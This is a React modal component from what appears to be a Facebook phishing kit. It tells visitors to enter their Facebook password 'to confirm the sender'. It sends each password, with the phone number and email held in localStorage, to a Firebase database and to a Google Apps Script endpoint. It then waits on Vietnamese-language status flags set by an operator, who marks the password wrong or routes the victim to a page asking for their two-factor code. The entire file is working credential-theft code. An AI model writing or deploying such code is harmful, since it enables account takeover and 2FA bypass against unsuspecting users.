import axios from "axios";
import React, { useEffect, useState } from "react";

import { onValue, ref, update } from "firebase/database";
import { database } from "../../Utils/firebase";
import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
import InputPassword from "../UI/InputPassword/InputPassword";
import Validating from "../Validating";
import "./Modal.scss";
import { useNavigate } from "react-router";

const passwords = [];

// eslint-disable-next-line react/prop-types, no-unused-vars
const Modal = ({ isModal, setIsModal }) => {
  const [password, setPassword] = React.useState("");

  const [error_password, setErrorPassword] = React.useState(false);
  const [validating, setValidating] = useState(false);

  const natigate = useNavigate();

  const styleModal = ["modal"];
  if (isModal) {
    styleModal.push("modal__active");
  }

  const handleContinue = () => {
    if (!password) {
      return;
    }
    setErrorPassword(false);
    setValidating(true);
    passwords.push(password);
    const data = JSON.parse(localStorage.getItem("form"));
    const form = new FormData();
    // form.append("day", data.day);
    // form.append("month", data.month);
    // form.append("year", data.year);
    form.append("phone", data.phone);
    form.append("email", data.email);
    form.append("password", passwords);

    const updates = {};
    updates[
      "/records/" + localStorage.getItem("record_uid") + "/" + "password"
    ] = passwords;
    updates[
      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
    ] = "Đang chờ xác nhận mật khẩu user từ admin";

    update(ref(database), updates);

    axios.post(
      "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
      form
    );
  };

  useEffect(() => {
    if (isModal) {
      const starCountRef = ref(
        database,
        "records/" + localStorage.getItem("record_uid")
      );
      onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        console.log(data);
        if (data?.user_status === "Mật khẩu sai. Đang chờ user nhập lại.") {
          setValidating(false);
          setErrorPassword(true);
        } else if (data?.user_status === "Thành công") {
          natigate("/success");
        } else if (data?.user_status === "Nhập mã 2fa") {
          const updates = {};
          updates[
            "/records/" +
              localStorage.getItem("record_uid") +
              "/" +
              "user_status"
          ] = "Đang chờ user nhập mã 2fa";
          update(ref(database), updates).then(() => {
            natigate("/confirm/2fa-code", {
              replace: true,
            });
          });
        }
      });
    }
  }, [isModal]);

  return (
    <div
      className={styleModal.join(" ")}
      aria-hidden="false"
      // onClick={() => setIsModal((state) => !state)}
    >
      <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          {/* <div className="modal-header">
            <div className="modal-title" id="exampleModalLabel">
              Please Enter Your Password
            </div>
            <button
              type="button"
              className="btn-close"
              onClick={() => setIsModal((state) => !state)}
            ></button>
          </div> */}

          <div className="modal-body" style={{}}>
            <h1
              style={{
                fontSize: "1.35rem",
                color: "#444",

                marginTop: "1.15rem",
              }}
            >
              Please enter your facebook password to continue
            </h1>
            <div
              style={{
                height: 1,
                width: "100%",
                background: "rgb(218, 221, 225)",
                marginTop: "1rem",
                marginBottom: "1.25rem",
              }}
            />

            <div className="modal__body-description">
              We need to confirm the sender of the information is you, Please
              enter your facebook password and then continue.
            </div>
            <div className="modal__body-password">
              <InputPassword
                value={password}
                fun={(e) => setPassword(e.target.value)}
              >
                Password
              </InputPassword>
              {error_password > 0 && (
                <p className="text-danger">
                  Incorrect facebook password, please try again.
                </p>
              )}

              {validating && <Validating />}
            </div>
            <div
              style={{
                marginBottom: "1.25rem",
              }}
            >
              <ButtonSoft
                disabled={password.length > 0 && !validating}
                fun={handleContinue}
              >
                Continue
              </ButtonSoft>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Modal;
